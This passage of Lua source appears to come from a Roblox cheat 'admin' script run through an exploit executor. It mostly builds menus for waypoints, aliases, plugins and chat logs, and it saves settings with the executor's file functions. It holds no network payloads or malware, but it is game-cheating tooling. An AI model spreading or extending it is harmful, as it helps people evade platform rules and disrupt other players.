Exit_2.Parent = shadow_2
Exit_2.BackgroundColor3 = Color3.new(1, 1, 1)
Exit_2.BackgroundTransparency = 1
Exit_2.Size = UDim2.new(0, 20, 0, 20)
Exit_2.ZIndex = 4
Exit_2.Image = "rbxassetid://2132544126"

PositionsFrame.Name = "PositionsFrame"
PositionsFrame.Parent = Settings
PositionsFrame.Active = true
PositionsFrame.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
PositionsFrame.BorderSizePixel = 0
PositionsFrame.Size = UDim2.new(0, 250, 0, 175)
PositionsFrame.Position = UDim2.new(0, 0, 0, 175)

Close_3.Name = "Close"
Close_3.Parent = PositionsFrame
Close_3.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Close_3.BorderSizePixel = 0
Close_3.Position = UDim2.new(0, 205, 0, 150)
Close_3.Size = UDim2.new(0, 40, 0, 20)
Close_3.Font = Enum.Font.SourceSans
Close_3.FontSize = Enum.FontSize.Size14
Close_3.Text = "Close"
Close_3.TextColor3 = Color3.new(0, 0, 0)

Delete_5.Name = "Delete"
Delete_5.Parent = PositionsFrame
Delete_5.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_5.BorderSizePixel = 0
Delete_5.Position = UDim2.new(0, 5, 0, 150)
Delete_5.Size = UDim2.new(0, 40, 0, 20)
Delete_5.Font = Enum.Font.SourceSans
Delete_5.FontSize = Enum.FontSize.Size14
Delete_5.Text = "Clear"
Delete_5.TextColor3 = Color3.new(0, 0, 0)

Holder_4.Name = "Holder"
Holder_4.Parent = PositionsFrame
Holder_4.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Holder_4.BackgroundTransparency = 1
Holder_4.BorderSizePixel = 0
Holder_4.Position = UDim2.new(0, 0, 0, 0)
Holder_4.Selectable = false
Holder_4.Size = UDim2.new(0, 250, 0, 145)
Holder_4.BottomImage = "rbxasset://textures/blackBkg_square.png"
Holder_4.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_4.MidImage = "rbxasset://textures/blackBkg_square.png"
Holder_4.ScrollBarThickness = 8
Holder_4.TopImage = "rbxasset://textures/blackBkg_square.png"

Example_4.Name = "Example"
Example_4.Parent = PositionsFrame
Example_4.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Example_4.BackgroundTransparency = 0.5
Example_4.BorderSizePixel = 0
Example_4.Size = UDim2.new(0, 10, 0, 20)
Example_4.Visible = false
Example_4.Position = UDim2.new(0, 0, 0, -5)

Text_5.Name = "Text"
Text_5.Parent = Example_4
Text_5.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Text_5.BackgroundTransparency = 0.5
Text_5.BorderSizePixel = 0
Text_5.Position = UDim2.new(0, 10, 0, 0)
Text_5.Size = UDim2.new(0, 240, 0, 20)
Text_5.Font = Enum.Font.SourceSans
Text_5.FontSize = Enum.FontSize.Size14
Text_5.Text = "Position"
Text_5.TextColor3 = Color3.new(1, 1, 1)
Text_5.TextXAlignment = Enum.TextXAlignment.Left

Delete_6.Name = "Delete"
Delete_6.Parent = Text_5
Delete_6.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_6.BorderSizePixel = 0
Delete_6.Position = UDim2.new(0, 200, 0, 0)
Delete_6.Size = UDim2.new(0, 40, 0, 20)
Delete_6.Font = Enum.Font.SourceSans
Delete_6.FontSize = Enum.FontSize.Size14
Delete_6.Text = "Delete"
Delete_6.TextColor3 = Color3.new(0, 0, 0)

TP.Name = "TP"
TP.Parent = Text_5
TP.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
TP.BorderSizePixel = 0
TP.Position = UDim2.new(0, 155, 0, 0)
TP.Size = UDim2.new(0, 40, 0, 20)
TP.Font = Enum.Font.SourceSans
TP.FontSize = Enum.FontSize.Size14
TP.Text = "Goto"
TP.TextColor3 = Color3.new(0, 0, 0)

AliasesFrame.Name = "AliasesFrame"
AliasesFrame.Parent = Settings
AliasesFrame.Active = true
AliasesFrame.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
AliasesFrame.BorderSizePixel = 0
AliasesFrame.Position = UDim2.new(0, 0, 0, 175)
AliasesFrame.Size = UDim2.new(0, 250, 0, 175)

Close_2.Name = "Close"
Close_2.Parent = AliasesFrame
Close_2.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Close_2.BorderSizePixel = 0
Close_2.Position = UDim2.new(0, 205, 0, 150)
Close_2.Size = UDim2.new(0, 40, 0, 20)
Close_2.Font = Enum.Font.SourceSans
Close_2.FontSize = Enum.FontSize.Size14
Close_2.Text = "Close"
Close_2.TextColor3 = Color3.new(0, 0, 0)

Delete_3.Name = "Delete"
Delete_3.Parent = AliasesFrame
Delete_3.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_3.BorderSizePixel = 0
Delete_3.Position = UDim2.new(0, 5, 0, 150)
Delete_3.Size = UDim2.new(0, 40, 0, 20)
Delete_3.Font = Enum.Font.SourceSans
Delete_3.FontSize = Enum.FontSize.Size14
Delete_3.Text = "Clear"
Delete_3.TextColor3 = Color3.new(0, 0, 0)

Holder_3.Name = "Holder"
Holder_3.Parent = AliasesFrame
Holder_3.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Holder_3.BackgroundTransparency = 1
Holder_3.BorderSizePixel = 0
Holder_3.Position = UDim2.new(0, 0, 0, 0)
Holder_3.Size = UDim2.new(0, 250, 0, 145)
Holder_3.BottomImage = "rbxasset://textures/blackBkg_square.png"
Holder_3.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_3.MidImage = "rbxasset://textures/blackBkg_square.png"
Holder_3.ScrollBarThickness = 0
Holder_3.TopImage = "rbxasset://textures/blackBkg_square.png"

Example_3.Name = "Example"
Example_3.Parent = AliasesFrame
Example_3.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Example_3.BackgroundTransparency = 0.5
Example_3.BorderSizePixel = 0
Example_3.Size = UDim2.new(0, 10, 0, 20)
Example_3.Visible = false

Text_4.Name = "Text"
Text_4.Parent = Example_3
Text_4.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Text_4.BackgroundTransparency = 0.5
Text_4.BorderSizePixel = 0
Text_4.Position = UDim2.new(0, 10, 0, 0)
Text_4.Size = UDim2.new(0, 240, 0, 20)
Text_4.Font = Enum.Font.SourceSans
Text_4.FontSize = Enum.FontSize.Size14
Text_4.Text = "honk"
Text_4.TextColor3 = Color3.new(1, 1, 1)
Text_4.TextXAlignment = Enum.TextXAlignment.Left

Delete_4.Name = "Delete"
Delete_4.Parent = Text_4
Delete_4.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_4.BorderSizePixel = 0
Delete_4.Position = UDim2.new(0, 200, 0, 0)
Delete_4.Size = UDim2.new(0, 40, 0, 20)
Delete_4.Font = Enum.Font.SourceSans
Delete_4.FontSize = Enum.FontSize.Size14
Delete_4.Text = "Delete"
Delete_4.TextColor3 = Color3.new(0, 0, 0)

PluginsFrame.Name = "PluginsFrame"
PluginsFrame.Parent = Settings
PluginsFrame.Active = true
PluginsFrame.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
PluginsFrame.BorderSizePixel = 0
PluginsFrame.Position = UDim2.new(0, 0, 0, 175)
PluginsFrame.Size = UDim2.new(0, 250, 0, 175)

Close_4.Name = "Close"
Close_4.Parent = PluginsFrame
Close_4.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Close_4.BorderSizePixel = 0
Close_4.Position = UDim2.new(0, 205, 0, 150)
Close_4.Size = UDim2.new(0, 40, 0, 20)
Close_4.Font = Enum.Font.SourceSans
Close_4.FontSize = Enum.FontSize.Size14
Close_4.Text = "Close"
Close_4.TextColor3 = Color3.new(0, 0, 0)

Add_3.Name = "Add"
Add_3.Parent = PluginsFrame
Add_3.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Add_3.BorderSizePixel = 0
Add_3.Position = UDim2.new(0, 5, 0, 150)
Add_3.Size = UDim2.new(0, 40, 0, 20)
Add_3.Font = Enum.Font.SourceSans
Add_3.FontSize = Enum.FontSize.Size14
Add_3.Text = "Add"
Add_3.TextColor3 = Color3.new(0, 0, 0)

Holder_5.Name = "Holder"
Holder_5.Parent = PluginsFrame
Holder_5.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Holder_5.BackgroundTransparency = 1
Holder_5.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Holder_5.BorderSizePixel = 0
Holder_5.Position = UDim2.new(0, 0, 0, 0)
Holder_5.Selectable = false
Holder_5.Size = UDim2.new(0, 250, 0, 140)
Holder_5.BottomImage = "rbxasset://textures/blackBkg_square.png"
Holder_5.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_5.MidImage = "rbxasset://textures/blackBkg_square.png"
Holder_5.ScrollBarThickness = 0
Holder_5.TopImage = "rbxasset://textures/blackBkg_square.png"

Example_5.Name = "Example"
Example_5.Parent = PluginsFrame
Example_5.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Example_5.BackgroundTransparency = 0.5
Example_5.BorderSizePixel = 0
Example_5.Size = UDim2.new(0, 10, 0, 20)
Example_5.Visible = false

Text_6.Name = "Text"
Text_6.Parent = Example_5
Text_6.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Text_6.BackgroundTransparency = 0.5
Text_6.BorderSizePixel = 0
Text_6.Position = UDim2.new(0, 10, 0, 0)
Text_6.Size = UDim2.new(0, 240, 0, 20)
Text_6.Font = Enum.Font.SourceSans
Text_6.FontSize = Enum.FontSize.Size14
Text_6.Text = "F4 > Toggle Fly"
Text_6.TextColor3 = Color3.new(1, 1, 1)
Text_6.TextXAlignment = Enum.TextXAlignment.Left

Delete_7.Name = "Delete"
Delete_7.Parent = Text_6
Delete_7.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_7.BorderSizePixel = 0
Delete_7.Position = UDim2.new(0, 200, 0, 0)
Delete_7.Size = UDim2.new(0, 40, 0, 20)
Delete_7.Font = Enum.Font.SourceSans
Delete_7.FontSize = Enum.FontSize.Size14
Delete_7.Text = "Delete"
Delete_7.TextColor3 = Color3.new(0, 0, 0)

PluginEditor.Name = randomString()
PluginEditor.Parent = PARENT
PluginEditor.Active = true
PluginEditor.BackgroundColor3 = Color3.new(1, 1, 1)
PluginEditor.BackgroundTransparency = 1
PluginEditor.Position = UDim2.new(0.5, -180, 0, -400)
PluginEditor.Size = UDim2.new(0, 360, 0, 20)
PluginEditor.ZIndex = 4

background_3.Name = "background"
background_3.Parent = PluginEditor
background_3.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
background_3.BorderSizePixel = 0
background_3.Position = UDim2.new(0, 0, 0, 20)
background_3.Size = UDim2.new(0, 360, 0, 160)

Dark_8.Name = "Dark"
Dark_8.Parent = background_3
Dark_8.Active = true
Dark_8.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_8.BackgroundTransparency = 0.5
Dark_8.BorderSizePixel = 0
Dark_8.Size = UDim2.new(0, 360, 0, 5)

Dark_9.Name = "Dark"
Dark_9.Parent = background_3
Dark_9.Active = true
Dark_9.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_9.BackgroundTransparency = 0.5
Dark_9.BorderSizePixel = 0
Dark_9.Position = UDim2.new(0, 220, 0, 5)
Dark_9.Size = UDim2.new(0, 5, 0, 155)

Img.Name = "Img"
Img.Parent = background_3
Img.BackgroundColor3 = Color3.new(1, 1, 1)
Img.BackgroundTransparency = 1
Img.Position = UDim2.new(0, 242, 0, 3)
Img.Size = UDim2.new(0, 100, 0, 95)
Img.Image = "rbxassetid://318740854"

AddPlugin.Name = "AddPlugin"
AddPlugin.Parent = background_3
AddPlugin.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
AddPlugin.BackgroundTransparency = 0.5
AddPlugin.BorderSizePixel = 0
AddPlugin.Position = UDim2.new(0, 235, 0, 100)
AddPlugin.Size = UDim2.new(0, 115, 0, 50)
AddPlugin.Font = Enum.Font.SourceSans
AddPlugin.FontSize = Enum.FontSize.Size18
AddPlugin.Text = "Add Plugin"
AddPlugin.TextColor3 = Color3.new(1, 1, 1)
AddPlugin.TextStrokeTransparency = 0

FileName.Name = "FileName"
FileName.Parent = background_3
FileName.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
FileName.BackgroundTransparency = 0.5
FileName.BorderSizePixel = 0
FileName.Position = UDim2.new(0.027777778, 0, 0.625, 0)
FileName.Size = UDim2.new(0, 200, 0, 50)
FileName.Font = Enum.Font.SourceSans
FileName.FontSize = Enum.FontSize.Size18
FileName.Text = "Plugin File Name"
FileName.TextColor3 = Color3.new(1, 1, 1)
FileName.TextStrokeTransparency = 0

About.Name = "About"
About.Parent = background_3
About.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
About.BackgroundTransparency = 1
About.BorderSizePixel = 0
About.Position = UDim2.new(0, 17, 0, 17)
About.Size = UDim2.new(0, 187, 0, 49)
About.Font = Enum.Font.SourceSansBold
About.FontSize = Enum.FontSize.Size14
About.Text = "Plugins are .iy files and should be located in the 'workspace' folder of your exploit."
About.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
About.TextStrokeTransparency = 0
About.TextWrapped = true
About.TextYAlignment = Enum.TextYAlignment.Top

Directions_2.Name = "Directions"
Directions_2.Parent = background_3
Directions_2.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Directions_2.BackgroundTransparency = 1
Directions_2.BorderSizePixel = 0
Directions_2.Position = UDim2.new(0, 17, 0, 66)
Directions_2.Size = UDim2.new(0, 187, 0, 49)
Directions_2.Font = Enum.Font.SourceSansBold
Directions_2.FontSize = Enum.FontSize.Size14
Directions_2.Text = "Type the name of the plugin file you want to add below."
Directions_2.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
Directions_2.TextStrokeTransparency = 0
Directions_2.TextWrapped = true
Directions_2.TextYAlignment = Enum.TextYAlignment.Top

shadow_3.Name = "shadow"
shadow_3.Parent = PluginEditor
shadow_3.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
shadow_3.BorderColor3 = Color3.new(0, 0, 0)
shadow_3.BorderSizePixel = 0
shadow_3.Size = UDim2.new(0, 360, 0, 20)
shadow_3.ZIndex = 4

PopupText_3.Name = "PopupText"
PopupText_3.Parent = shadow_3
PopupText_3.BackgroundTransparency = 1
PopupText_3.Position = UDim2.new(0, 51, 0, 0)
PopupText_3.Size = UDim2.new(0.760355055, -16, 0.949999988, 0)
PopupText_3.ZIndex = 4
PopupText_3.Font = Enum.Font.SourceSans
PopupText_3.TextSize = 20
PopupText_3.Text = "Add Plugins"
PopupText_3.TextColor3 = Color3.new(1, 1, 1)
PopupText_3.TextStrokeTransparency = 0
PopupText_3.TextWrapped = true

Exit_3.Name = "Exit"
Exit_3.Parent = shadow_3
Exit_3.BackgroundColor3 = Color3.new(1, 1, 1)
Exit_3.BackgroundTransparency = 1
Exit_3.Size = UDim2.new(0, 20, 0, 20)
Exit_3.ZIndex = 4
Exit_3.Image = "rbxassetid://2132544126"

logsDrag.Name = randomString()
logsDrag.Parent = PARENT
logsDrag.Active = true
logsDrag.BackgroundColor3 = Color3.new(1, 1, 1)
logsDrag.BackgroundTransparency = 1
logsDrag.Position = UDim2.new(0, 0, 1, 10)
logsDrag.Size = UDim2.new(0, 338, 0, 20)
logsDrag.ZIndex = 4

shadow.Name = "shadow"
shadow.Parent = logsDrag
shadow.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 338, 0, 20)
shadow.ZIndex = 4

Hide.Name = "Hide"
Hide.Parent = shadow
Hide.BackgroundColor3 = Color3.new(1, 1, 1)
Hide.BackgroundTransparency = 1
Hide.Position = UDim2.new(0, 20, 0, 0)
Hide.Size = UDim2.new(0, 20, 0, 20)
Hide.ZIndex = 4
Hide.Image = "rbxassetid://2406617031"
Hide.ImageTransparency = 0.5

PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 48, 0, 0)
PopupText.Size = UDim2.new(0.760355055, -16, 0.949999988, 0)
PopupText.ZIndex = 4
PopupText.Font = Enum.Font.SourceSans
PopupText.TextSize = 20
PopupText.Text = "Chat Logs"
PopupText.TextColor3 = Color3.new(1, 1, 1)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true

Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundColor3 = Color3.new(1, 1, 1)
Exit.BackgroundTransparency = 1
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.ZIndex = 4
Exit.Image = "rbxassetid://2132544126"

scroll.Name = "scroll"
scroll.Parent = logsDrag
scroll.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
scroll.BackgroundTransparency = 0.5
scroll.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
scroll.BorderSizePixel = 0
scroll.Position = UDim2.new(0, 5, 0, 30)
scroll.Size = UDim2.new(0, 328, 0, 190)
scroll.ZIndex = 5
scroll.BottomImage = "rbxasset://textures/blackBkg_square.png"
scroll.CanvasSize = UDim2.new(0, 0, 0, 10)
scroll.MidImage = "rbxasset://textures/blackBkg_square.png"
scroll.ScrollBarThickness = 8
scroll.TopImage = "rbxasset://textures/blackBkg_square.png"

background.Name = "background"
background.Parent = logsDrag
background.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
background.BorderColor3 = Color3.new(0, 0, 0)
background.BorderSizePixel = 0
background.Position = UDim2.new(0, 0, 1, 0)
background.Size = UDim2.new(0, 338, 0, 230)
background.ZIndex = 4

Dark_6.Name = "Dark"
Dark_6.Parent = background
Dark_6.Active = true
Dark_6.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_6.BackgroundTransparency = 0.5
Dark_6.BorderSizePixel = 0
Dark_6.Size = UDim2.new(0, 338, 0, 5)
Dark_6.ZIndex = 4

Clear.Name = "Clear"
Clear.Parent = background
Clear.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Clear.BorderSizePixel = 0
Clear.Position = UDim2.new(0, 5, 0, 205)
Clear.Size = UDim2.new(0, 50, 0, 20)
Clear.ZIndex = 4
Clear.Font = Enum.Font.SourceSans
Clear.FontSize = Enum.FontSize.Size14
Clear.Text = "Clear"
Clear.TextColor3 = Color3.new(0, 0, 0)

Toggle.Name = "Toggle"
Toggle.Parent = background
Toggle.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Toggle.BorderSizePixel = 0
Toggle.Position = UDim2.new(0, 60, 0, 205)
Toggle.Size = UDim2.new(0, 50, 0, 20)
Toggle.ZIndex = 4
Toggle.Font = Enum.Font.SourceSans
Toggle.FontSize = Enum.FontSize.Size14
Toggle.Text = "Disabled"
Toggle.TextColor3 = Color3.new(0, 0, 0)

function writefileExploit()
	if writefile then
		return true
	end
end

function isNumber(str)
	return tonumber(str) ~= nil
end

function tools(plr)
	if plr.Backpack:FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
		return true
	end
end

function r15(plr)
	if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
		return true
	end
end

defaultsettings = {
	prefix = ';';
	StayOpen = false;
	logsEnabled = false;
	aliases = {};
	binds = {};
	WayPoints = {};
	PluginsTable = {}
}

defaults = game:GetService("HttpService"):JSONEncode(defaultsettings)

local nosaves = false

function saves()
	if writefileExploit() then
		if pcall(function() readfile("IY_FE.iy") end) then
			if readfile("IY_FE.iy") ~= nil then
				local json = game:GetService("HttpService"):JSONDecode(readfile("IY_FE.iy"))
				if json.prefix ~= nil then prefix = json.prefix else prefix = ';' end
				if json.StayOpen ~= nil then StayOpen = json.StayOpen else StayOpen = false end
				if json.logsEnabled ~= nil then logsEnabled = json.logsEnabled else logsEnabled = false end
				if json.aliases ~= nil then aliases = json.aliases else aliases = {} end
				if json.binds ~= nil then binds = json.binds else binds = {} end
				if json.WayPoints ~= nil then WayPoints = json.WayPoints else WayPoints = {} end
				if json.PluginsTable ~= nil then PluginsTable = json.PluginsTable else PluginsTable = {} end
			else
				writefile("IY_FE.iy", defaults)
				wait()
				saves()
			end
		else
			writefile("IY_FE.iy", defaults)
			wait()
			if pcall(function() readfile("IY_FE.iy") end) then
				saves()
			else
				nosaves = true
				prefix = ';'
				StayOpen = false
				logsEnabled = false
				aliases = {}
				binds = {}
				WayPoints = {}
				PluginsTable = {}
				
				local FileError = Instance.new("Frame")
				local background = Instance.new("Frame")
				local Directions = Instance.new("TextLabel")
				local Dark = Instance.new("Frame")
				local shadow = Instance.new("Frame")
				local PopupText = Instance.new("TextLabel")
				local Exit = Instance.new("ImageButton")
				
				FileError.Name = randomString()
				FileError.Parent = PARENT
				FileError.Active = true
				FileError.BackgroundColor3 = Color3.new(1, 1, 1)
				FileError.BackgroundTransparency = 1
				FileError.Position = UDim2.new(0.5, -180, 0, 290)
				FileError.Size = UDim2.new(0, 360, 0, 20)
				FileError.ZIndex = 4
				
				background.Name = "background"
				background.Parent = FileError
				background.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
				background.BorderSizePixel = 0
				background.Position = UDim2.new(0, 0, 0, 20)
				background.Size = UDim2.new(0, 360, 0, 210)
				
				Directions.Name = "Directions"
				Directions.Parent = background
				Directions.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
				Directions.BackgroundTransparency = 1
				Directions.BorderSizePixel = 0
				Directions.Position = UDim2.new(0, 10, 0, 15)
				Directions.Size = UDim2.new(0, 340, 0, 185)
				Directions.Font = Enum.Font.SourceSansBold
				Directions.FontSize = Enum.FontSize.Size14
				Directions.Text = "There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again."
				Directions.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				Directions.TextStrokeTransparency = 0
				Directions.TextWrapped = true
				Directions.TextXAlignment = Enum.TextXAlignment.Left
				Directions.TextYAlignment = Enum.TextYAlignment.Top
				
				Dark.Name = "Dark"
				Dark.Parent = background
				Dark.Active = true
				Dark.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
				Dark.BackgroundTransparency = 0.5
				Dark.BorderSizePixel = 0
				Dark.Size = UDim2.new(0, 360, 0, 5)
				
				shadow.Name = "shadow"
				shadow.Parent = FileError
				shadow.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
				shadow.BorderColor3 = Color3.new(0, 0, 0)
				shadow.BorderSizePixel = 0
				shadow.Size = UDim2.new(0, 360, 0, 20)
				shadow.ZIndex = 4
				
				PopupText.Name = "PopupText"
				PopupText.Parent = shadow
				PopupText.BackgroundTransparency = 1
				PopupText.Position = UDim2.new(0, 51, 0, 0)
				PopupText.Size = UDim2.new(0.760355055, -16, 0.949999988, 0)
				PopupText.ZIndex = 4
				PopupText.Font = Enum.Font.SourceSans
				PopupText.FontSize = Enum.FontSize.Size24
				PopupText.Text = "File Error"
				PopupText.TextColor3 = Color3.new(1, 1, 1)
				PopupText.TextStrokeTransparency = 0
				PopupText.TextWrapped = true
				
				Exit.Name = "Exit"
				Exit.Parent = shadow
				Exit.BackgroundColor3 = Color3.new(1, 1, 1)
				Exit.BackgroundTransparency = 1
				Exit.Size = UDim2.new(0, 20, 0, 20)
				Exit.ZIndex = 4
				Exit.Image = "rbxassetid://2132544126"
				
				Exit.MouseButton1Click:Connect(function()
					FileError:Destroy()
				end)
			end
		end
	else
		prefix = ';'
		StayOpen = false
		logsEnabled = false
		aliases = {}
		binds = {}
		WayPoints = {}
		PluginsTable = {}
	end
end

saves()

function updatesaves()
	if nosaves == false and writefileExploit() then
		local update = {
		prefix = prefix;
		StayOpen = StayOpen;
		logsEnabled = logsEnabled;
		aliases = aliases;
		binds = binds;
		WayPoints = WayPoints;
		PluginsTable = PluginsTable
		}
		writefile("IY_FE.iy", game:GetService("HttpService"):JSONEncode(update))
	end
end

function Time()
	local HOUR = math.floor((tick() % 86400) / 3600)
	local MINUTE = math.floor((tick() % 3600) / 60)
	local SECOND = math.floor(tick() % 60)
	local AP = HOUR > 11 and 'PM' or 'AM'
	HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
	HOUR = HOUR < 10 and '0' .. HOUR or HOUR
	MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
	SECOND = SECOND < 10 and '0' .. SECOND or SECOND
	return HOUR .. ':' .. MINUTE .. ':' .. SECOND .. ' ' .. AP
end

UserInputService = game:GetService("UserInputService")
IYMouse = Players.LocalPlayer:GetMouse()
PrefixBox.Text = prefix
SettingsOpen = false

if StayOpen == false then
	Holder.Settings.StayOpen.Button.On.BackgroundTransparency = 1
else
	Holder.Settings.StayOpen.Button.On.BackgroundTransparency = 0
end

if logsEnabled then
	Toggle.Text = 'Enabled'
else
	Toggle.Text = 'Disabled'
end

holderOffset = -250
notifyOffset = -500

function maximizeHolder()
	if StayOpen == false then
		Holder:TweenPosition(UDim2.new(1, holderOffset, 1, -220), "InOut", "Quart", 0.2, true, nil)
	end
end

function minimizeHolder()
	if StayOpen == false then
		Holder:TweenPosition(UDim2.new(1, holderOffset, 1, -20), "InOut", "Quart", 0.5, true, nil)
	end
end

function cmdbarHolder()
	if StayOpen == false then
		Holder:TweenPosition(UDim2.new(1, holderOffset, 1, -45), "InOut", "Quart", 0.5, true, nil)
	end
end

function enablebuttons()
	Settings.Aliases.Select.Visible = true
	Settings.Color.Select.Visible = true
	Settings.Keybinds.Select.Visible = true
	Settings.StayOpen.Button.On.Visible = true
	Settings.Prefix.PrefixBox.Visible = true
	Settings.Positions.Select.Visible = true
	Settings.Plugins.Select.Visible = true
end

function disablebuttons()
	Settings.Aliases.Select.Visible = false
	Settings.Color.Select.Visible = false
	Settings.Keybinds.Select.Visible = false
	Settings.StayOpen.Button.On.Visible = false
	Settings.Prefix.PrefixBox.Visible = false
	Settings.Positions.Select.Visible = false
	Settings.Plugins.Select.Visible = false
end

notifyCount = 0
function notify(text,text2)
	spawn(function()
		local LnotifyCount = notifyCount+1
		notifyCount = notifyCount+1
		Notification:TweenPosition(UDim2.new(1, notifyOffset, 1, -0), "InOut", "Quart", 0.5, true, nil)
		wait(0.6)
		local closepressed = false
		if text2 then
			Notification.Title.Text = text
			Notification.Text.Text = text2
		else
			Notification.Title.Text = 'Notification'
			Notification.Text.Text = text
		end
		Notification:TweenPosition(UDim2.new(1, notifyOffset, 1, -100), "InOut", "Quart", 0.5, true, nil)
		Notification.CloseButton.MouseButton1Click:Connect(function()
			Notification:TweenPosition(UDim2.new(1, notifyOffset, 1, -0), "InOut", "Quart", 0.5, true, nil)
			closepressed = true
		end)
		wait(10)
		if LnotifyCount == notifyCount then
			if closepressed == false then
				Notification:TweenPosition(UDim2.new(1, notifyOffset, 1, -0), "InOut", "Quart", 0.5, true, nil)
			end
			notifyCount = 0
		end
	end)
end

function CreateLabel(Name, Text)
	local sf = scroll
	if #sf:GetChildren() >= 2546 then
		sf:ClearAllChildren()
	end
	local alls = 0
	for i,v in pairs(sf:GetChildren()) do
		if v then
			alls = v.Size.Y.Offset + alls
		end
		if not v then
			alls = 0
		end
	end
	local tl = Instance.new('TextLabel', sf)
	local il = Instance.new('Frame', tl)
	tl.Name = Name
	tl.ZIndex = 6
	tl.Text = Time().." - ["..Name.."]: "..Text
	tl.Size = UDim2.new(0,322,0,84)
	tl.BackgroundTransparency = 1
	tl.BorderSizePixel = 0
	tl.Font = "SourceSansBold"
	tl.Position = UDim2.new(-1,0,0,alls)
	tl.TextTransparency = 1
	tl.TextScaled = false
	tl.TextSize = 14
	tl.TextWrapped = true
	tl.TextXAlignment = "Left"
	tl.TextYAlignment = "Top"
	il.BackgroundTransparency = 1
	il.BorderSizePixel = 0
	il.Size = UDim2.new(0,12,1,0)
	il.Position = UDim2.new(0,316,0,0)
	tl.TextColor3 = Color3.fromRGB(255,255,255)
	tl.Size = UDim2.new(0,322,0,tl.TextBounds.Y)
	sf.CanvasSize = UDim2.new(0,0,0,alls+tl.TextBounds.Y)
	sf.CanvasPosition = Vector2.new(0,sf.CanvasPosition.Y+tl.TextBounds.Y)
	local size2 = sf.CanvasSize.Y.Offset
	tl:TweenPosition(UDim2.new(0,3,0,alls), 'In', 'Quint', 0.5)
	for i = 0,50 do wait(0.05)
		tl.TextTransparency = tl.TextTransparency - 0.05
	end
	tl.TextTransparency = 0
end

IYMouse.KeyDown:connect(function(Key)
	if (Key==prefix) then
		Holder.Cmdbar:CaptureFocus()
		maximizeHolder()
		if SettingsOpen == true then
			wait(0.2)
			Holder.Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
		end
	end
end)

Holder.MouseEnter:Connect(function()
	maximizeHolder()
end)

Holder.MouseLeave:Connect(function()
	minimizeHolder()
end)

Holder.SettingsButton.MouseButton1Click:Connect(function()
	if SettingsOpen == false then SettingsOpen = true
		Holder.Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.5, true, nil)
	else SettingsOpen = false
